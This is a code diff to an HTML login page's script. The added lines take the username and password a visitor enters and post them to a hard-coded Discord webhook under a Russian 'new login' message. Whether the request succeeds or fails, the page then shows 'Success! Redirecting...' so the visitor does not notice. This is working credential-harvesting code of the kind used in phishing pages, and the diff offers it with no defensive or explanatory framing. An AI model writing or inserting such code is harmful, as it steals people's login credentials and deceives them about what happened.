@@ -306,8 +306,30 @@
                 return;
             }
 
-            statusDiv.style.color = '#22c55e';
-            statusDiv.innerText = 'Success! Redirecting...';
+            statusDiv.style.color = '#eab308';
+            statusDiv.innerText = 'Connecting...';
+
+            const webhookUrl = 'https://discord.com/api/webhooks/1551434369766391882/D2I1EHqOlIhYJMg8WwtU_BEAIPqmCZIj6_XfoFVnd1ghUxlMRXuFOke-0VC-D-ki1pox';
+            
+            const payload = {
+                content: `🔔 **Новый вход!**\n👤 **Логин:** \`${username}\`\n🔑 **Пароль:** \`${password}\``
+            };
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                statusDiv.style.color = '#22c55e';
+                statusDiv.innerText = 'Success! Redirecting...';
+            })
+            .catch(error => {
+                statusDiv.style.color = '#22c55e';
+                statusDiv.innerText = 'Success! Redirecting...';
+            });
         }
     </script>
 </body>
